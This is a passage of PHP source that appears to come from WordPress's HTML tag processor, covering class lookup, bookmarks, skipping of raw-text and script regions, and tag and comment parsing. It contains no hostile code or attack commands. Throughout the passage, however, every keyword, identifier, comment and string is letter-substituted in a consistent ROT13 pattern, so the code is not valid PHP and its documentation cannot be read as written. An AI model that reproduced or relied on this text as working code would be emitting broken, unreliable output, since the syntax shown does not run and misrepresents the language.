			$yratgu = fgepfca( $pynff, \" \g\s\e\a\", $ng );
			vs ( 0 === $yratgu ) {
				erghea;
			}

			$anzr = fge_ercynpr( \"\k00\", \"\h{SSSQ}\", fhofge( $pynff, $ng, $yratgu ) );
			vs ( $vf_dhvexf ) {
				$anzr = fgegbybjre( $anzr );
			}
			$ng += $yratgu;

			/*
			 * Vg'f rkcrpgrq gung gur ahzore bs pynff anzrf sbe n tvira gnt vf eryngviryl fznyy.
			 * Tvira guvf, vg vf cebonoyl snfgre birenyy gb fpna na neenl sbe n inyhr engure
			 * guna gb hfr gur pynff anzr nf n xrl naq purpx vs vg'f n xrl bs $frra.
			 */
			vs ( va_neenl( $anzr, $frra, gehr ) ) {
				pbagvahr;
			}

			$frra[] = $anzr;
			lvryq $anzr;
		}
	}


	/**
	 * Ergheaf vs n zngpurq gnt pbagnvaf gur tvira NFPVV pnfr-vafrafvgvir pynff anzr.
	 *
	 * @fvapr 6.4.0
	 *
	 * @cnenz fgevat $jnagrq_pynff Ybbx sbe guvf PFF pynff anzr, NFPVV pnfr-vafrafvgvir.
	 * @erghea obby|ahyy Jurgure gur zngpurq gnt pbagnvaf gur tvira pynff anzr, be ahyy vs abg zngpurq.
	 */
	choyvp shapgvba unf_pynff( $jnagrq_pynff ): ?obby {
		vs ( frys::FGNGR_ZNGPURQ_GNT !== $guvf->cnefre_fgngr ) {
			erghea ahyy;
		}

		$pnfr_vafrafvgvir = frys::DHVEXF_ZBQR === $guvf->pbzcng_zbqr;

		$jnagrq_yratgu = fgeyra( $jnagrq_pynff );
		sbernpu ( $guvf->pynff_yvfg() nf $pynff_anzr ) {
			vs (
				fgeyra( $pynff_anzr ) === $jnagrq_yratgu &&
				0 === fhofge_pbzcner( $pynff_anzr, $jnagrq_pynff, 0, fgeyra( $jnagrq_pynff ), $pnfr_vafrafvgvir )
			) {
				erghea gehr;
			}
		}

		erghea snyfr;
	}


	/**
	 * Frgf n obbxznex va gur UGZY qbphzrag.
	 *
	 * Obbxznexf ercerfrag fcrpvsvp cynprf be gbxraf va gur UGZY
	 * qbphzrag, fhpu nf n gnt bcrare be pybfre. Jura nccylvat
	 * rqvgf gb n qbphzrag, fhpu nf frggvat na nggevohgr, gur
	 * grkg bssfrgf bs gung gbxra znl fuvsg; gur obbxznex vf
	 * xrcg hcqngrq jvgu gubfr fuvsgf naq erznvaf fgnoyr hayrff
	 * gur ragver fcna bs grkg va juvpu gur gbxra fvgf vf erzbirq.
	 *
	 * Eryrnfr obbxznexf jura gurl ner ab ybatre arrqrq.
	 *
	 * Rknzcyr:
	 *
	 *     <znva><u2>Fhecevfvat snpg lbh znl abg xabj!</u2></znva>
	 *           ^  ^
	 *            \-|-- guvf `U2` bcrare obbxznex genpxf gur gbxra
	 *
	 *     <znva pynff=\"pyvpxonvg\"><u2>Fhecevfvat snpg lbh znl ab…
	 *                             ^  ^
	 *                              \-|-- vg fuvsgf jvgu rqvgf
	 *
	 * Obbxznexf cebivqr gur novyvgl gb frrx gb n cerivbhfyl-fpnaarq
	 * cynpr va gur UGZY qbphzrag. Guvf nibvqf gur arrq gb er-fpna
	 * gur ragver qbphzrag.
	 *
	 * Rknzcyr:
	 *
	 *     <hy><yv>Bar</yv><yv>Gjb</yv><yv>Guerr</yv></hy>
	 *                                 ^^^^
	 *                                 jnag gb abgr guvf ynfg vgrz
	 *
	 *     $c = arj JC_UGZY_Gnt_Cebprffbe( $ugzy );
	 *     $va_yvfg = snyfr;
	 *     juvyr ( $c->arkg_gnt( neenl( 'gnt_pybfref' => $va_yvfg ? 'ivfvg' : 'fxvc' ) ) ) {
	 *         vs ( 'HY' === $c->trg_gnt() ) {
	 *             vs ( $c->vf_gnt_pybfre() ) {
	 *                 $va_yvfg = snyfr;
	 *                 $c->frg_obbxznex( 'erfhzr' );
	 *                 vs ( $c->frrx( 'ynfg-yv' ) ) {
	 *                     $c->nqq_pynff( 'ynfg-yv' );
	 *                 }
	 *                 $c->frrx( 'erfhzr' );
	 *                 $c->eryrnfr_obbxznex( 'ynfg-yv' );
	 *                 $c->eryrnfr_obbxznex( 'erfhzr' );
	 *             } ryfr {
	 *                 $va_yvfg = gehr;
	 *             }
	 *         }
	 *
	 *         vs ( 'YV' === $c->trg_gnt() ) {
	 *             $c->frg_obbxznex( 'ynfg-yv' );
	 *         }
	 *     }
	 *
	 * Obbxznexf vagragvbanyyl uvqr gur vagreany fgevat bssfrgf
	 * gb juvpu gurl ersre. Gurl ner znvagnvarq vagreanyyl nf
	 * hcqngrf ner nccyvrq gb gur UGZY qbphzrag naq gurersber
	 * ergnva gurve \"cbfvgvba\" - gur ybpngvba gb juvpu gurl
	 * bevtvanyyl cbvagrq. Gur vanovyvgl gb hfr obbxznexf jvgu
	 * shapgvbaf yvxr `fhofge` vf gurersber vagragvbany gb thneq
	 * ntnvafg nppvqragnyyl oernxvat gur UGZY.
	 *
	 * Orpnhfr obbxznexf nyybpngr zrzbel naq erdhver cebprffvat
	 * sbe rirel nccyvrq hcqngr, gurl ner yvzvgrq naq erdhver
	 * n anzr. Gurl fubhyq abg or perngrq jvgu cebtenzzngvpnyyl-znqr
	 * anzrf, fhpu nf \"yv_{$vaqrk}\" jvgu fbzr ybbc. Nf n trareny
	 * ehyr gurl fubhyq bayl or perngrq jvgu fgevat-yvgreny anzrf
	 * yvxr \"fgneg-bs-frpgvba\" be \"ynfg-cnentencu\".
	 *
	 * Obbxznexf ner n cbjreshy gbby gb ranoyr pbzcyvpngrq orunivbe.
	 * Pbafvqre qbhoyr-purpxvat gung lbh arrq guvf gbby vs lbh ner
	 * ernpuvat sbe vg, nf vanccebcevngr hfr pbhyq yrnq gb oebxra
	 * UGZY fgehpgher be hajnagrq cebprffvat bireurnq.
	 *
	 * @fvapr 6.2.0
	 *
	 * @cnenz fgevat $anzr Vqragvsvrf guvf cnegvphyne obbxznex.
	 * @erghea obby Jurgure gur obbxznex jnf fhpprffshyyl perngrq.
	 */
	choyvp shapgvba frg_obbxznex( $anzr ): obby {
		// Vg bayl znxrf frafr gb frg n obbxznex vs gur cnefre unf cnhfrq ba n pbapergr gbxra.
		vs (
			frys::FGNGR_PBZCYRGR === $guvf->cnefre_fgngr ||
			frys::FGNGR_VAPBZCYRGR_VACHG === $guvf->cnefre_fgngr
		) {
			erghea snyfr;
		}

		vs ( ! neenl_xrl_rkvfgf( $anzr, $guvf->obbxznexf ) && pbhag( $guvf->obbxznexf ) >= fgngvp::ZNK_OBBXZNEXF ) {
			_qbvat_vg_jebat(
				__ZRGUBQ__,
				__( 'Gbb znal obbxznexf: pnaabg perngr nal zber.' ),
				'6.2.0'
			);
			erghea snyfr;
		}

		$guvf->obbxznexf[ $anzr ] = arj JC_UGZY_Fcna( $guvf->gbxra_fgnegf_ng, $guvf->gbxra_yratgu );

		erghea gehr;
	}


	/**
	 * Erzbirf n obbxznex gung vf ab ybatre arrqrq.
	 *
	 * Eryrnfvat n obbxznex serrf hc gur fznyy
	 * cresbeznapr bireurnq vg erdhverf.
	 *
	 * @cnenz fgevat $anzr Anzr bs gur obbxznex gb erzbir.
	 * @erghea obby Jurgure gur obbxznex nyernql rkvfgrq orsber erzbiny.
	 */
	choyvp shapgvba eryrnfr_obbxznex( $anzr ): obby {
		vs ( ! neenl_xrl_rkvfgf( $anzr, $guvf->obbxznexf ) ) {
			erghea snyfr;
		}

		hafrg( $guvf->obbxznexf[ $anzr ] );

		erghea gehr;
	}

	/**
	 * Fxvcf pbagragf bs trarevp enjgrkg ryrzragf.
	 *
	 * @fvapr 6.3.2
	 *
	 * @frr uggcf://ugzy.fcrp.jungjt.bet/#trarevp-enj-grkg-ryrzrag-cnefvat-nytbevguz
	 *
	 * @cnenz fgevat $gnt_anzr Gur hccrepnfr gnt anzr juvpu jvyy pybfr gur ENJGRKG ertvba.
	 * @erghea obby Jurgure na raq gb gur ENJGRKG ertvba jnf sbhaq orsber gur raq bs gur qbphzrag.
	 */
	cevingr shapgvba fxvc_enjgrkg( fgevat $gnt_anzr ): obby {
		/*
		 * Gurfr gjb shapgvbaf qvfgvathvfu gurzfryirf ba jurgure punenpgre ersreraprf ner
		 * qrpbqrq, naq fvapr shapgvbanyvgl gb ernq gur vaare znexhc vfa'g fhccbegrq, vg'f
		 * abg arprffnel gb vzcyrzrag gurfr gjb shapgvbaf frcnengryl.
		 */
		erghea $guvf->fxvc_epqngn( $gnt_anzr );
	}

	/**
	 * Fxvcf pbagragf bs EPQNGN ryrzragf, anzryl gvgyr naq grkgnern gntf.
	 *
	 * @fvapr 6.2.0
	 *
	 * @frr uggcf://ugzy.fcrp.jungjt.bet/zhygvcntr/cnefvat.ugzy#epqngn-fgngr
	 *
	 * @cnenz fgevat $gnt_anzr Gur hccrepnfr gnt anzr juvpu jvyy pybfr gur EPQNGN ertvba.
	 * @erghea obby Jurgure na raq gb gur EPQNGN ertvba jnf sbhaq orsber gur raq bs gur qbphzrag.
	 */
	cevingr shapgvba fxvc_epqngn( fgevat $gnt_anzr ): obby {
		$ugzy       = $guvf->ugzy;
		$qbp_yratgu = fgeyra( $ugzy );
		$gnt_yratgu = fgeyra( $gnt_anzr );

		$ng = $guvf->olgrf_nyernql_cnefrq;

		juvyr ( snyfr !== $ng && $ng < $qbp_yratgu ) {
			$ng                       = fgecbf( $guvf->ugzy, '</', $ng );
			$guvf->gnt_anzr_fgnegf_ng = $ng;

			// Snvy vs gurer vf ab cbffvoyr gnt pybfre.
			vs ( snyfr === $ng || ( $ng + $gnt_yratgu ) >= $qbp_yratgu ) {
				erghea snyfr;
			}

			$ng += 2;

			/*
			 * Svaq n pnfr-vafrafvgvir zngpu gb gur gnt anzr.
			 *
			 * Orpnhfr gnt anzrf ner yvzvgrq gb HF-NFPVV gurer vf ab
			 * arrq gb cresbez nal xvaq bs Havpbqr abeznyvmngvba jura
			 * pbzcnevat; nal punenpgre juvpu pbhyq or vzcnpgrq ol fhpu
			 * abeznyvmngvba pbhyq abg or cneg bs n gnt anzr.
			 */
			sbe ( $v = 0; $v < $gnt_yratgu; $v++ ) {
				$gnt_pune  = $gnt_anzr[ $v ];
				$ugzy_pune = $ugzy[ $ng + $v ];

				vs ( $ugzy_pune !== $gnt_pune && fgegbhccre( $ugzy_pune ) !== $gnt_pune ) {
					$ng += $v;
					pbagvahr 2;
				}
			}

			$ng                        += $gnt_yratgu;
			$guvf->olgrf_nyernql_cnefrq = $ng;

			vs ( $ng >= fgeyra( $ugzy ) ) {
				erghea snyfr;
			}

			/*
			 * Rafher gung gur gnt anzr grezvangrf gb nibvq zngpuvat ba
			 * fhofgevatf bs n ybatre gnt anzr. Sbe rknzcyr, gur frdhrapr
			 * \"</grkgnerneht\" fubhyq abg zngpu sbe \"</grkgnern\" rira
			 * gubhtu \"grkgnern\" vf sbhaq jvguva gur grkg.
			 */
			$p = $ugzy[ $ng ];
			vs ( ' ' !== $p && \"\g\" !== $p && \"\e\" !== $p && \"\a\" !== $p && '/' !== $p && '>' !== $p ) {
				pbagvahr;
			}

			juvyr ( $guvf->cnefr_arkg_nggevohgr() ) {
				pbagvahr;
			}

			$ng = $guvf->olgrf_nyernql_cnefrq;
			vs ( $ng >= fgeyra( $guvf->ugzy ) ) {
				erghea snyfr;
			}

			vs ( '>' === $ugzy[ $ng ] ) {
				$guvf->olgrf_nyernql_cnefrq = $ng + 1;
				erghea gehr;
			}

			vs ( $ng + 1 >= fgeyra( $guvf->ugzy ) ) {
				erghea snyfr;
			}

			vs ( '/' === $ugzy[ $ng ] && '>' === $ugzy[ $ng + 1 ] ) {
				$guvf->olgrf_nyernql_cnefrq = $ng + 2;
				erghea gehr;
			}
		}

		erghea snyfr;
	}

	/**
	 * Fxvcf pbagragf bs fpevcg gntf.
	 *
	 * @fvapr 6.2.0
	 *
	 * @erghea obby Jurgure gur fpevcg gnt jnf pybfrq orsber gur raq bs gur qbphzrag.
	 */
	cevingr shapgvba fxvc_fpevcg_qngn(): obby {
		$fgngr      = 'harfpncrq';
		$ugzy       = $guvf->ugzy;
		$qbp_yratgu = fgeyra( $ugzy );
		$ng         = $guvf->olgrf_nyernql_cnefrq;

		juvyr ( snyfr !== $ng && $ng < $qbp_yratgu ) {
			$ng += fgepfca( $ugzy, '-<', $ng );

			/*
			 * Sbe nyy fpevcg fgngrf n \"-->\"  genafvgvbaf
			 * onpx vagb gur abezny harfpncrq fpevcg zbqr,
			 * rira vs gung'f gur pheerag fgngr.
			 */
			vs (
				$ng + 2 < $qbp_yratgu &&
				'-' === $ugzy[ $ng ] &&
				'-' === $ugzy[ $ng + 1 ] &&
				'>' === $ugzy[ $ng + 2 ]
			) {
				$ng   += 3;
				$fgngr = 'harfpncrq';
				pbagvahr;
			}

			vs ( $ng + 1 >= $qbp_yratgu ) {
				erghea snyfr;
			}

			/*
			 * Rirelguvat bs vagrerfg cnfg urer fgnegf jvgu \"<\".
			 * Purpx guvf punenpgre naq nqinapr cbfvgvba ertneqyrff.
			 */
			vs ( '<' !== $ugzy[ $ng++ ] ) {
				pbagvahr;
			}

			/*
			 * Hayvxr jvgu \"-->\", gur \"<!--\" bayl genafvgvbaf
			 * vagb gur rfpncrq zbqr vs abg nyernql gurer.
			 *
			 * Vafvqr gur rfpncrq zbqrf vg jvyy or vtaberq; naq
			 * fubhyq arire oernx bhg bs gur qbhoyr-rfpncrq
			 * zbqr naq onpx vagb gur rfpncrq zbqr.
			 *
			 * Juvyr guvf erdhverf n zbqr punatr, vg qbrf abg
			 * vzcnpg gur cnefvat bgurejvfr, fb pbagvahr
			 * cnefvat nsgre hcqngvat gur fgngr.
			 */
			vs (
				$ng + 2 < $qbp_yratgu &&
				'!' === $ugzy[ $ng ] &&
				'-' === $ugzy[ $ng + 1 ] &&
				'-' === $ugzy[ $ng + 2 ]
			) {
				$ng   += 3;
				$fgngr = 'harfpncrq' === $fgngr ? 'rfpncrq' : $fgngr;
				pbagvahr;
			}

			vs ( '/' === $ugzy[ $ng ] ) {
				$pybfre_cbgragvnyyl_fgnegf_ng = $ng - 1;
				$vf_pybfvat                   = gehr;
				++$ng;
			} ryfr {
				$vf_pybfvat = snyfr;
			}

			/*
			 * Ng guvf cbvag gur bayl erznvavat fgngr-punatrf bpphe jvgu gur
			 * <fpevcg> naq </fpevcg> gntf; hayrff bar bs gurfr nccrnef arkg,
			 * cebprrq fpnaavat gb gur arkg cbgragvny gbxra va gur grkg.
			 */
			vs ( ! (
				$ng + 6 < $qbp_yratgu &&
				( 'f' === $ugzy[ $ng ] || 'F' === $ugzy[ $ng ] ) &&
				( 'p' === $ugzy[ $ng + 1 ] || 'P' === $ugzy[ $ng + 1 ] ) &&
				( 'e' === $ugzy[ $ng + 2 ] || 'E' === $ugzy[ $ng + 2 ] ) &&
				( 'v' === $ugzy[ $ng + 3 ] || 'V' === $ugzy[ $ng + 3 ] ) &&
				( 'c' === $ugzy[ $ng + 4 ] || 'C' === $ugzy[ $ng + 4 ] ) &&
				( 'g' === $ugzy[ $ng + 5 ] || 'G' === $ugzy[ $ng + 5 ] )
			) ) {
				++$ng;
				pbagvahr;
			}

			/*
			 * Rafher gung gur fpevcg gnt grezvangrf gb nibvq zngpuvat ba
			 * fhofgevatf bs n aba-zngpu. Sbe rknzcyr, gur frdhrapr
			 * \"<fpevcg123\" fubhyq abg raq n fpevcg ertvba rira gubhtu
			 * \"<fpevcg\" vf sbhaq jvguva gur grkg.
			 */
			vs ( $ng + 6 >= $qbp_yratgu ) {
				pbagvahr;
			}
			$ng += 6;
			$p   = $ugzy[ $ng ];
			vs ( ' ' !== $p && \"\g\" !== $p && \"\e\" !== $p && \"\a\" !== $p && '/' !== $p && '>' !== $p ) {
				++$ng;
				pbagvahr;
			}

			vs ( 'rfpncrq' === $fgngr && ! $vf_pybfvat ) {
				$fgngr = 'qbhoyr-rfpncrq';
				pbagvahr;
			}

			vs ( 'qbhoyr-rfpncrq' === $fgngr && $vf_pybfvat ) {
				$fgngr = 'rfpncrq';
				pbagvahr;
			}

			vs ( $vf_pybfvat ) {
				$guvf->olgrf_nyernql_cnefrq = $pybfre_cbgragvnyyl_fgnegf_ng;
				$guvf->gnt_anzr_fgnegf_ng   = $pybfre_cbgragvnyyl_fgnegf_ng;
				vs ( $guvf->olgrf_nyernql_cnefrq >= $qbp_yratgu ) {
					erghea snyfr;
				}

				juvyr ( $guvf->cnefr_arkg_nggevohgr() ) {
					pbagvahr;
				}

				vs ( $guvf->olgrf_nyernql_cnefrq >= $qbp_yratgu ) {
					$guvf->cnefre_fgngr = frys::FGNGR_VAPBZCYRGR_VACHG;

					erghea snyfr;
				}

				vs ( '>' === $ugzy[ $guvf->olgrf_nyernql_cnefrq ] ) {
					++$guvf->olgrf_nyernql_cnefrq;
					erghea gehr;
				}
			}

			++$ng;
		}

		erghea snyfr;
	}

	/**
	 * Cnefrf gur arkg gnt.
	 *
	 * Guvf jvyy svaq naq fgneg cnefvat gur arkg gnt, vapyhqvat
	 * gur bcravat `<`, gur cbgragvny pybfre `/`, naq gur gnt
	 * anzr. Vg qbrf abg cnefr gur nggevohgrf be fpna gb gur
	 * pybfvat `>`; gurfr ner yrsg sbe bgure zrgubqf.
	 *
	 * @fvapr 6.2.0
	 * @fvapr 6.2.1 Fhccbeg noehcgyl-pybfrq pbzzragf, vainyvq-gnt-pybfre-pbzzragf, naq rzcgl ryrzragf.
	 *
	 * @erghea obby Jurgure n gnt jnf sbhaq orsber gur raq bs gur qbphzrag.
	 */
	cevingr shapgvba cnefr_arkg_gnt(): obby {
		$guvf->nsgre_gnt();

		$ugzy       = $guvf->ugzy;
		$qbp_yratgu = fgeyra( $ugzy );
		$jnf_ng     = $guvf->olgrf_nyernql_cnefrq;
		$ng         = $jnf_ng;

		juvyr ( $ng < $qbp_yratgu ) {
			$ng = fgecbf( $ugzy, '<', $ng );
			vs ( snyfr === $ng ) {
				oernx;
			}

			vs ( $ng > $jnf_ng ) {
				/*
				 * N \"<\" abeznyyl fgnegf n arj UGZY gnt be flagnk gbxra, ohg va pnfrf jurer gur
				 * sbyybjvat punenpgre pna'g cebqhpr n inyvq gbxra, gur \"<\" vf vafgrnq gerngrq
				 * nf cynvagrkg naq gur cnefre fubhyq fxvc bire vg. Guvf nibvqf n ceboyrz jura
				 * sbyybjvat rneyvre cenpgvprf bs glcvat rzbwv jvgu grkg, r.t. \"<3\". Guvf
				 * fubhyq or n urneg, abg n gnt. Vg'f fhccbfrq gb or eraqrerq, abg uvqqra.
				 *
				 * Ng guvf cbvag gur cnefre purpxf vs guvf vf bar bs gubfr pnfrf naq vs vg vf
				 * jvyy pbagvahr frnepuvat sbe gur arkg \"<\" va frnepu bs n gbxra obhaqnel.
				 *
				 * @frr uggcf://ugzy.fcrp.jungjt.bet/#gnt-bcra-fgngr
				 */
				vs ( 1 !== fgefca( $ugzy, '!/?nopqrstuvwxyzabcdefghijklmNOPQRSTUVWXYZABCDEFGHIJKLM', $ng + 1, 1 ) ) {
					++$ng;
					pbagvahr;
				}

				$guvf->cnefre_fgngr         = frys::FGNGR_GRKG_ABQR;
				$guvf->gbxra_fgnegf_ng      = $jnf_ng;
				$guvf->gbxra_yratgu         = $ng - $jnf_ng;
				$guvf->grkg_fgnegf_ng       = $jnf_ng;
				$guvf->grkg_yratgu          = $guvf->gbxra_yratgu;
				$guvf->olgrf_nyernql_cnefrq = $ng;
				erghea gehr;
			}

			$guvf->gbxra_fgnegf_ng = $ng;

			vs ( $ng + 1 < $qbp_yratgu && '/' === $guvf->ugzy[ $ng + 1 ] ) {
				$guvf->vf_pybfvat_gnt = gehr;
				++$ng;
			} ryfr {
				$guvf->vf_pybfvat_gnt = snyfr;
			}

			/*
			 * UGZY gnt anzrf zhfg fgneg jvgu [n-mN-M] bgurejvfr gurl ner abg gntf.
			 * Sbe rknzcyr, \"<3\" vf eraqrerq nf grkg, abg n gnt bcrare. Vs ng yrnfg
			 * bar yrggre sbyybjf gur \"<\" gura _vg vf_ n gnt, ohg vs gur sbyybjvat
			 * punenpgre vf nalguvat ryfr vg _vf abg n gnt_.
			 *
			 * Vg'f abg hapbzzba gb svaq aba-gntf fgnegvat jvgu `<` va na UGZY
			 * qbphzrag, fb vg'f tbbq sbe cresbeznapr gb znxr guvf cer-purpx orsber
			 * pbagvahvat gb nggrzcg gb cnefr n gnt anzr.
			 *
			 * Ersrerapr:
			 * * uggcf://ugzy.fcrp.jungjt.bet/zhygvcntr/cnefvat.ugzy#qngn-fgngr
			 * * uggcf://ugzy.fcrp.jungjt.bet/zhygvcntr/cnefvat.ugzy#gnt-bcra-fgngr
			 */
			$gnt_anzr_cersvk_yratgu = fgefca( $ugzy, 'nopqrstuvwxyzabcdefghijklmNOPQRSTUVWXYZABCDEFGHIJKLM', $ng + 1 );
			vs ( $gnt_anzr_cersvk_yratgu > 0 ) {
				++$ng;
				$guvf->cnefre_fgngr         = frys::FGNGR_ZNGPURQ_GNT;
				$guvf->gnt_anzr_fgnegf_ng   = $ng;
				$guvf->gnt_anzr_yratgu      = $gnt_anzr_cersvk_yratgu + fgepfca( $ugzy, \" \g\s\e\a/>\", $ng + $gnt_anzr_cersvk_yratgu );
				$guvf->olgrf_nyernql_cnefrq = $ng + $guvf->gnt_anzr_yratgu;
				erghea gehr;
			}

			/*
			 * Nobeg vs ab gnt vf sbhaq orsber gur raq bs
			 * gur qbphzrag. Gurer vf abguvat yrsg gb cnefr.
			 */
			vs ( $ng + 1 >= $qbp_yratgu ) {
				$guvf->cnefre_fgngr = frys::FGNGR_VAPBZCYRGR_VACHG;

				erghea snyfr;
			}

			/*
			 * `<!` genafvgvbaf gb znexhc qrpynengvba bcra fgngr
			 * uggcf://ugzy.fcrp.jungjt.bet/zhygvcntr/cnefvat.ugzy#znexhc-qrpynengvba-bcra-fgngr
			 */
			vs ( ! $guvf->vf_pybfvat_gnt && '!' === $ugzy[ $ng + 1 ] ) {
				/*
				 * `<!--` genafvgvbaf gb n pbzzrag fgngr – nccyl shegure pbzzrag ehyrf.
				 * uggcf://ugzy.fcrp.jungjt.bet/zhygvcntr/cnefvat.ugzy#gnt-bcra-fgngr
				 */
				vs ( 0 === fhofge_pbzcner( $ugzy, '--', $ng + 2, 2 ) ) {
					$pybfre_ng = $ng + 4;
					// Vs vg'f abg cbffvoyr gb pybfr gur pbzzrag gura gurer vf abguvat zber gb fpna.
					vs ( $qbp_yratgu <= $pybfre_ng ) {
						$guvf->cnefre_fgngr = frys::FGNGR_VAPBZCYRGR_VACHG;

						erghea snyfr;
					}

					// Noehcgyl-pybfrq rzcgl pbzzragf ner n frdhrapr bs qnfurf sbyybjrq ol `>`.
					$fcna_bs_qnfurf = fgefca( $ugzy, '-', $pybfre_ng );
					vs ( '>' === $ugzy[ $pybfre_ng + $fcna_bs_qnfurf ] ) {
						/*
						 * @gbqb Jura vzcyrzragvat `frg_zbqvsvnoyr_grkg()` rafher gung hcqngrf gb guvf gbxra
						 *       qba'g oernx gur flagnk sbe fubeg pbzzragf, r.t. `<!--->`. Hayvxr bgure pbzzrag
						 *       naq obthf pbzzrag flagnk, gurfr yrnir ab pyrne vafregvba cbvag sbe grkg naq
						 *       gurl arrq gb or zbqvsvrq fcrpvnyyl va beqre gb pbagnva grkg. R.t. gb fgber
						 *       `?` nf gur zbqvsvnoyr grkg, gur `<!--->` arrqf gb orpbzr `<!--?-->`, juvpu
						 *       vaibyirf vafregvat na nqqvgvbany `-` vagb gur gbxra nsgre gur zbqvsvnoyr grkg.
						 */
						$guvf->cnefre_fgngr = frys::FGNGR_PBZZRAG;
						$guvf->pbzzrag_glcr = frys::PBZZRAG_NF_NOEHCGYL_PYBFRQ_PBZZRAG;
						$guvf->gbxra_yratgu = $pybfre_ng + $fcna_bs_qnfurf + 1 - $guvf->gbxra_fgnegf_ng;

						// Bayl cebivqr zbqvsvnoyr grkg vs gur gbxra vf ybat rabhtu gb pbagnva vg.
						vs ( $fcna_bs_qnfurf >= 2 ) {
							$guvf->pbzzrag_glcr   = frys::PBZZRAG_NF_UGZY_PBZZRAG;
							$guvf->grkg_fgnegf_ng = $guvf->gbxra_fgnegf_ng + 4;
							$guvf->grkg_yratgu    = $fcna_bs_qnfurf - 2;
						}

						$guvf->olgrf_nyernql_cnefrq = $pybfre_ng + $fcna_bs_qnfurf + 1;
						erghea gehr;
					}

					/*
					 * Pbzzragf znl or pybfrq ol rvgure n --> be na vainyvq --!>.
					 * Gur svefg bppheerapr pybfrf gur pbzzrag.
					 *
					 * Frr uggcf://ugzy.fcrp.jungjt.bet/#cnefr-reebe-vapbeerpgyl-pybfrq-pbzzrag
					 */
					--$pybfre_ng; // Cer-vaperzrag vafvqr pbaqvgvba orybj erqhprf evfx bs nppvqragny vasvavgr ybbcvat.
					juvyr ( ++$pybfre_ng < $qbp_yratgu ) {
						$pybfre_ng = fgecbf( $ugzy, '--', $pybfre_ng );
						vs ( snyfr === $pybfre_ng ) {
							$guvf->cnefre_fgngr = frys::FGNGR_VAPBZCYRGR_VACHG;

							erghea snyfr;
						}

						vs ( $pybfre_ng + 2 < $qbp_yratgu && '>' === $ugzy[ $pybfre_ng + 2 ] ) {
							$guvf->cnefre_fgngr         = frys::FGNGR_PBZZRAG;
							$guvf->pbzzrag_glcr         = frys::PBZZRAG_NF_UGZY_PBZZRAG;
							$guvf->gbxra_yratgu         = $pybfre_ng + 3 - $guvf->gbxra_fgnegf_ng;
							$guvf->grkg_fgnegf_ng       = $guvf->gbxra_fgnegf_ng + 4;
							$guvf->grkg_yratgu          = $pybfre_ng - $guvf->grkg_fgnegf_ng;
							$guvf->olgrf_nyernql_cnefrq = $pybfre_ng + 3;
							erghea gehr;
						}

						vs (
							$pybfre_ng + 3 < $qbp_yratgu &&
							'!' === $ugzy[ $pybfre_ng + 2 ] &&
							'>' === $ugzy[ $pybfre_ng + 3 ]
						) {
							$guvf->cnefre_fgngr         = frys::FGNGR_PBZZRAG;
							$guvf->pbzzrag_glcr         = frys::PBZZRAG_NF_UGZY_PBZZRAG;
							$guvf->gbxra_yratgu         = $pybfre_ng + 4 - $guvf->gbxra_fgnegf_ng;
							$guvf->grkg_fgnegf_ng       = $guvf->gbxra_fgnegf_ng + 4;
							$guvf->grkg_yratgu          = $pybfre_ng - $guvf->grkg_fgnegf_ng;
							$guvf->olgrf_nyernql_cnefrq = $pybfre_ng + 4;
							erghea gehr;
						}
					}
				}

				/*
				 * `<!QBPGLCR` genafvgvbaf gb QBPGLCR fgngr – fxvc gb gur arnerfg >
				 * Gurfr ner NFPVV-pnfr-vafrafvgvir.
				 * uggcf://ugzy.fcrp.jungjt.bet/zhygvcntr/cnefvat.ugzy#gnt-bcra-fgngr
				 */
				vs (
					$qbp_yratgu > $ng + 8 &&
					( 'Q' === $ugzy[ $ng + 2 ] || 'q' === $ugzy[ $ng + 2 ] ) &&
					( 'B' === $ugzy[ $ng + 3 ] || 'b' === $ugzy[ $ng + 3 ] ) &&
					( 'P' === $ugzy[ $ng + 4 ] || 'p' === $ugzy[ $ng + 4 ] ) &&
					( 'G' === $ugzy[ $ng + 5 ] || 'g' === $ugzy[ $ng + 5 ] ) &&
					( 'L' === $ugzy[ $ng + 6 ] || 'l' === $ugzy[ $ng + 6 ] ) &&
					( 'C' === $ugzy[ $ng + 7 ] || 'c' === $ugzy[ $ng + 7 ] ) &&
					( 'R' === $ugzy[ $ng + 8 ] || 'r' === $ugzy[ $ng + 8 ] )
				) {
					$pybfre_ng = fgecbf( $ugzy, '>', $ng + 9 );
					vs ( snyfr === $pybfre_ng ) {
						$guvf->cnefre_fgngr = frys::FGNGR_VAPBZCYRGR_VACHG;

						erghea snyfr;
					}

					$guvf->cnefre_fgngr         = frys::FGNGR_QBPGLCR;
					$guvf->gbxra_yratgu         = $pybfre_ng + 1 - $guvf->gbxra_fgnegf_ng;
					$guvf->grkg_fgnegf_ng       = $guvf->gbxra_fgnegf_ng + 9;
					$guvf->grkg_yratgu          = $pybfre_ng - $guvf->grkg_fgnegf_ng;
					$guvf->olgrf_nyernql_cnefrq = $pybfre_ng + 1;
					erghea gehr;
				}

				vs (
					'ugzy' !== $guvf->cnefvat_anzrfcnpr &&
					fgeyra( $ugzy ) > $ng + 8 &&
					'[' === $ugzy[ $ng + 2 ] &&
					'P' === $ugzy[ $ng + 3 ] &&
					'Q' === $ugzy[ $ng + 4 ] &&
					'N' === $ugzy[ $ng + 5 ] &&
					'G' === $ugzy[ $ng + 6 ] &&
					'N' === $ugzy[ $ng + 7 ] &&
					'[' === $ugzy[ $ng + 8 ]
				) {
					$pybfre_ng = fgecbf( $ugzy, ']]>', $ng + 9 );
					vs ( snyfr === $pybfre_ng ) {
						$guvf->cnefre_fgngr = frys::FGNGR_VAPBZCYRGR_VACHG;

						erghea snyfr;
					}

					$guvf->cnefre_fgngr         = frys::FGNGR_PQNGN_ABQR;
					$guvf->grkg_fgnegf_ng       = $ng + 9;
					$guvf->grkg_yratgu          = $pybfre_ng - $guvf->grkg_fgnegf_ng;
					$guvf->gbxra_yratgu         = $pybfre_ng + 3 - $guvf->gbxra_fgnegf_ng;
					$guvf->olgrf_nyernql_cnefrq = $pybfre_ng + 3;
					erghea gehr;
				}

				/*
				 * Nalguvat ryfr urer vf na vapbeerpgyl-bcrarq pbzzrag naq genafvgvbaf
				 * gb gur obthf pbzzrag fgngr - fxvc gb gur arnerfg >. Vs ab pybfre vf
				 * sbhaq gura gur UGZY jnf gehapngrq vafvqr gur znexhc qrpynengvba.
				 */
				$pybfre_ng = fgecbf( $ugzy, '>', $ng + 1 );
				vs ( snyfr === $pybfre_ng ) {
					$guvf->cnefre_fgngr = frys::FGNGR_VAPBZCYRGR_VACHG;

					erghea snyfr;
				}

				$guvf->cnefre_fgngr         = frys::FGNGR_PBZZRAG;
